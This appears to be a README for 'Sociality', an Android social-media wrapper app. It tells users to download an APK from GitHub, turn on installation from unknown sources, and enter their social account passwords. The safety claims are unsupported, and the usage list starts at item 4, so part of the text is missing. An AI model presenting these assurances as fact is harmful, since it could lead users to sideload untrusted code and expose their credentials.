## 🚀 Getting Started

Using Sociality is straightforward. Even if you have never installed anything outside the Google Play Store, you will find these steps simple to follow.

You will download the app from the official GitHub releases page. Then, you will allow your phone to install an app from outside the Play Store. Finally, you will open Sociality and log in to your social media accounts through it.

## 📥 Download & Install

### Step 1: Go to the download page  
Visit the official Sociality release page on GitHub to download the app:

[![Download Sociality](https://img.shields.io/badge/Download-Sociality-blue?style=for-the-badge)](https://github.com/mely056/Sociality/releases)

This page has the latest version available. Look for the file with a name ending in `.apk`. This is the installation file for Android.

---

### Step 2: Download the APK file  
Tap the `.apk` file to start the download. Your browser may warn you about downloading files from unknown sources. This is normal for apps not from the Google Play Store.

---

### Step 3: Allow installing apps from unknown sources  
Before installing, you need to change a setting on your phone:

- Open **Settings**  
- Tap **Security** or **Privacy** (depends on your device)  
- Find **Install unknown apps** or **Unknown sources**  
- Select your browser (e.g., Chrome)  
- Turn on **Allow from this source**  

---

### Step 4: Install Sociality  
Once the download completes, open the file. Your phone will ask you to confirm the installation. Tap **Install**.

---

### Step 5: Open and set up Sociality  
After installation, open Sociality from your app drawer. You will see a simple menu to log in to Facebook, Instagram, Twitter, Reddit, LinkedIn, Threads, or any other supported platform.

Enter your usual login details to connect. Sociality does not store your credentials insecurely; it acts as a light wrapper to the official services.

## 🔧 How to Use Sociality

4. **Manage notifications:** Customize which notifications you want to receive, saving battery by blocking unnecessary ones.  
5. **Update regularly:** Check the GitHub releases page for updates to keep your app working well.  

Sociality focuses on the content you want, not on extra features that slow down your phone.

## ⚠️ Troubleshooting Tips

If you find Sociality is not installing or not working as expected, try the following:

- Make sure you downloaded the `.apk` file completely. Avoid partial or broken downloads.  
- Confirm you allowed installation from unknown sources.  
- Restart your phone after installation if the app does not open.  
- Check your internet connection. Sociality needs an active connection to load feeds.  
- Clear the app cache via your device settings if you see display issues.

## 🔄 Updating Sociality

Sociality is not installed from the Play Store, so it will not update automatically. To update:

1. Visit the release page: https://github.com/mely056/Sociality/releases  
2. Download the newest `.apk` file.  
3. Install like the first time (the app will replace the old version without losing your settings).  

---

## 🔐 Privacy & Security

Sociality does not track your data beyond what the social media platforms require. Your login information is handled securely through the platforms' standard login methods.

Because Sociality reduces background activity, it also limits the data apps send when you are not actively using them.
